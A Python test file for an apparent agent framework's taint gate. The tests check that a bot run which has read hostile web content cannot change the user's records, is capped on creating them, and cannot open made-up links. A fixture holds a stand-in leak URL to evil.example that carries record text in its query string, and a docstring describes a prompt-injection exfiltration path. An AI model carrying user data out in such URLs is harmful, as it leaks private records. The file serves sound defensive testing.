"""ToolRunner + gate (M1 D3): what a tainted run may do with the user's records."""

from __future__ import annotations

from types import MappingProxyType

import pytest

from roost.bots.status import Activity, ActivityBoard
from roost.config import load_config
from roost.constants import MAX_TAINTED_CREATES_PER_RUN
from roost.db.connection import init_db
from roost.desk.fake import FakeDesk
from roost.events.hub import EventHub
from roost.gateway.auth import register_user
from roost.llm.types import ToolCallRequested, ToolSpec
from roost.talk.domain_tools import DomainTools, RecordContext
from roost.talk.gate import LINK_REFUSAL_TEXT, TAINTED_CHANGE_TEXT, TAINTED_CREATE_CAP_TEXT, Gate
from roost.talk.link_scope import LinkScope
from roost.talk.outcome import ToolOutcome
from roost.talk.tool_catalog import CATALOG
from roost.talk.tool_def import ToolDef
from roost.talk.tool_runner import ToolRunner
from team_helpers import make_bot

_EMPTY = {"type": "object", "properties": {}}
_KINDS = {"add_thing": "write_create", "change_thing": "write_change", "list_things": "read", "count_things": "read"}
_HOSTILE = "https://hostile.example/page"
_LEAK = "https://evil.example/?d=Pay+the+rent"
_FAKE = MappingProxyType({**CATALOG, **{
    name: ToolDef(ToolSpec(name, name, _EMPTY), kind) for name, kind in _KINDS.items()
}})


class _Things:
    """A stand-in domain role: records each call and the taint it saw."""

    names = frozenset(_KINDS)

    def __init__(self) -> None:
        self.calls: list[tuple[str, bool]] = []

    def activity(self, name: str) -> str:
        return "working on things"

    async def run(self, name: str, arguments: dict, ctx: RecordContext) -> ToolOutcome:
        self.calls.append((name, ctx.tainted))
        if name == "list_things":
            return ToolOutcome("a thing from web content", tainted=True)
        if name == "count_things":
            return ToolOutcome("3 things: Pay the rent, …")   # clean records
        return ToolOutcome(f"{name} ok", created=name == "add_thing")


@pytest.fixture
async def cfg():
    config = load_config()
    await init_db(config)
    return config


@pytest.fixture
async def ids(cfg):
    user_id = (await register_user(cfg, "alice", "pw-123456")).id
    return user_id, (await make_bot(cfg, user_id, "Ledger")).id


def _runner(cfg, ids, things: _Things, *, tainted: bool, desk: FakeDesk | None = None, **options) -> ToolRunner:
    user_id, bot_id = ids
    return ToolRunner(
        user_id=user_id, bot_id=bot_id, desk=desk or FakeDesk(bot_id), gate=Gate(cfg, catalog=_FAKE),
        activity=ActivityBoard(), events=EventHub(cfg), allowed=frozenset(_FAKE), tainted=tainted,
        domain=DomainTools((things,)), **options,
    )


def _call(name: str) -> ToolCallRequested:
    return ToolCallRequested(id=name, name=name, arguments={})


def _open(url: str) -> ToolCallRequested:
    return ToolCallRequested(id=url, name="open_page", arguments={"url": url})


async def test_a_create_in_a_tainted_run_reaches_the_store_marked_tainted(cfg, ids):
    things = _Things()
    assert await _runner(cfg, ids, things, tainted=True).run(_call("add_thing")) == "add_thing ok"
    assert things.calls == [("add_thing", True)]


async def test_reading_a_tainted_item_taints_the_run_and_blocks_a_change(cfg, ids):
    things = _Things()
    runner = _runner(cfg, ids, things, tainted=False)
    await runner.run(_call("list_things"))
    assert runner.tainted is True
    assert await runner.run(_call("change_thing")) == TAINTED_CHANGE_TEXT
    assert things.calls == [("list_things", False)]


async def test_a_clean_run_may_change(cfg, ids):
    things = _Things()
    assert await _runner(cfg, ids, things, tainted=False).run(_call("change_thing")) == "change_thing ok"


async def test_a_create_past_the_cap_in_a_tainted_run_is_refused(cfg, ids):
    things = _Things()
    runner = _runner(cfg, ids, things, tainted=True)
    results = [await runner.run(_call("add_thing")) for _ in range(MAX_TAINTED_CREATES_PER_RUN + 1)]
    assert results == ["add_thing ok"] * MAX_TAINTED_CREATES_PER_RUN + [TAINTED_CREATE_CAP_TEXT]
    assert len(things.calls) == MAX_TAINTED_CREATES_PER_RUN


async def test_a_guarded_run_opens_the_stored_link_not_the_models_spelling(cfg, ids):
    """R3: the gate matches, the browser opens the scope's own entry."""
    desk = FakeDesk(ids[1])
    runner = _runner(cfg, ids, _Things(), tainted=True, desk=desk,
                     link_scope=LinkScope.of(["https://a.example/s?x=1&y=2"]), link_guard=True)
    await runner.run(_open("https://a.example/s?x=1&amp;y=2"))
    assert desk.open_page_calls == ["https://a.example/s?x=1&y=2"]


async def test_a_records_bot_that_read_a_page_opens_no_made_up_link(cfg, ids):
    """R2, path (a): a bot holding a record role reads a hostile page, lists
    the user's records, then tries to carry them out in a made-up URL."""
    desk = FakeDesk(ids[1])
    runner = _runner(cfg, ids, _Things(), tainted=False, desk=desk, sees_records=True)
    await runner.run(_open(_HOSTILE))
    await runner.run(_call("count_things"))
    assert await runner.run(_open(_LEAK)) == LINK_REFUSAL_TEXT
    assert desk.open_page_calls == [_HOSTILE]


async def test_records_read_first_then_a_hostile_page_still_guard_links(cfg, ids):
    """R2, the other order, in a run with no record role: a clean record
    read arms the guard the moment a page taints the run."""
    desk = FakeDesk(ids[1])
    runner = _runner(cfg, ids, _Things(), tainted=False, desk=desk)
    await runner.run(_call("count_things"))
    await runner.run(_open(_HOSTILE))
    assert await runner.run(_open(_LEAK)) == LINK_REFUSAL_TEXT
    assert desk.open_page_calls == [_HOSTILE]


async def test_a_web_only_run_that_sees_no_records_keeps_todays_posture(cfg, ids):
    desk = FakeDesk(ids[1])
    runner = _runner(cfg, ids, _Things(), tainted=False, desk=desk)
    await runner.run(_open(_HOSTILE))
    await runner.run(_open("https://other.example/next"))
    assert desk.open_page_calls == [_HOSTILE, "https://other.example/next"]


async def test_an_activity_line_carries_the_runs_taint(cfg, ids):
    """S1 list_bots: a line written after outside content is marked, so another bot sees only the status."""
    runner = _runner(cfg, ids, _Things(), tainted=False)
    await runner.run(_call("count_things"))
    assert runner._activity.entry(ids[1]) == Activity("working on things", tainted=False)
    await runner.run(_open(_HOSTILE))
    await runner.run(ToolCallRequested(id="r", name="read_page", arguments={}))
    line = runner._activity.entry(ids[1])
    assert line is not None and line.text.startswith("reading") and line.tainted is True
